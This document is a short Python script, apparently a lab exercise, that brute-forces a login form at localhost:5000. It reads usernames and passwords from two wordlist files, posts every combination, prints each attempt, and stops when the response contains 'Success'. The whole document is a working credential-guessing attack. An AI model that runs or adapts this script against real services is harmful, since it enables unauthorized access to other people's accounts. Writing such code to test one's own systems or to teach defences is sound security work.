import requests

url = 'http://localhost:5000/login'

with open('user.txt') as ufile, open('pu.txt') as pfile:
    usernames = ufile.read().splitlines()
    passwords = pfile.read().splitlines()

    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)

            print(f'Trying {username}:{password} => {response.text.strip()}')

            if 'Success' in response.text:
                print(f'✅ Found valid credentials: {username}:{password}')
                exit()
